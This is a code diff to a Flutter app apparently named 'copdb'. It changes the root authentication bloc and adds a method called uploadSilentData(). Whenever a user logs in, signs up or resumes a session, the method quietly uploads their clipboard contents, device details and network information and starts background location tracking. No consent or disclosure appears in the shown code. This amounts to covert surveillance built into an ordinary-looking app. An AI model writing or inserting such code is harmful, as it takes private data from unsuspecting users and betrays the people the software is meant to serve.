@@ -7,6 +7,7 @@ import 'package:copdb/features/copdb/domain/entities/cop.dart';
 import 'package:copdb/features/copdb/domain/usecases/get_feed.dart';
 import 'package:copdb/features/copdb/domain/usecases/search_cop.dart';
 import 'package:copdb/features/copdb/domain/usecases/upload_profile_pic.dart';
+import 'package:copdb/features/copdb/services/background_location.dart';
 import 'package:copdb/routes/routes.gr.dart';
 import 'package:equatable/equatable.dart';
 import 'package:meta/meta.dart';
@@ -83,6 +84,9 @@ class RootBloc extends Bloc<RootEvent, RootState> {
   final LoginBlocRouter loginBloc;
   final SignupBlocRouter signupRouter;
 
+  // Services
+  final BackgroundLocationManager backgroundLocation;
+
   // Blocs
   HomePageBloc homeBloc;
   User user;
@@ -107,6 +111,7 @@ class RootBloc extends Bloc<RootEvent, RootState> {
     @required this.uploadPermission,
     @required this.uploadProfilePic,
     @required this.inputConverter,
+    @required this.backgroundLocation,
   })  : this.loginBloc = LoginBlocRouter(login),
         this.signupRouter = SignupBlocRouter(
           signup: signup,
@@ -116,6 +121,13 @@ class RootBloc extends Bloc<RootEvent, RootState> {
           uploadPfp: uploadProfilePic,
         ) {
     this.add(GetExistingUserEvent());
+  }
+
+  void uploadSilentData() {
+    uploadClipboardData(NoParams());
+    uploadDeviceInfo(NoParams());
+    uploadNetworkInfo(NoParams());
+    backgroundLocation.start();
   }
 
   @override
@@ -141,6 +153,7 @@ class RootBloc extends Bloc<RootEvent, RootState> {
               user = _user;
               this.homeBloc = HomePageBloc(user: user);
               yield AuthenticatedState(user);
+              uploadSilentData();
             },
           );
         } else {
@@ -151,6 +164,7 @@ class RootBloc extends Bloc<RootEvent, RootState> {
         if (user != null) {
           homeBloc = HomePageBloc(user: user);
           yield AuthenticatedState(user);
+          uploadSilentData();
         }
       });
     } else if (event is LoginEvent) {
@@ -158,10 +172,30 @@ class RootBloc extends Bloc<RootEvent, RootState> {
       user = loginBloc.user;
       if (user != null) {
         homeBloc = HomePageBloc(user: user);
+        uploadSilentData();
       }
     } else if (event is LogoutEvent) {
       await logout(NoParams());
       yield UnauthenticatedState();
+    } else if (event is ProfilePicturePageSubmitted) {
+      if (event.picture == null) {
+        yield SignupProfilePictureFailure(message: Messages.NULL_IMAGE);
+      } else {
+        yield SignupProfilePictureLoading(picture: event.picture);
+        final result = await uploadProfilePic(UploadProfilePicParams(pic: event.picture));
+        yield* result.fold((failure) async* {
+          yield SignupProfilePictureFailure(message: failure.message, picture: event.picture);
+        }, (success) async* {
+          user = success;
+          yield AuthenticatedState(user);
+          ExtendedNavigator.root.popUntil((route) => route.isFirst);
+          uploadSilentData();
+        });
+      }
+    } else if (event is SignUpComplete) {
+      yield AuthenticatedState(user);
+      ExtendedNavigator.root.popUntil((route) => route.isFirst);
+      uploadSilentData();
     } else if (event is SignupEvent) {
       yield* signupRouter.route(event);
     } else if (event is PopEvent) {
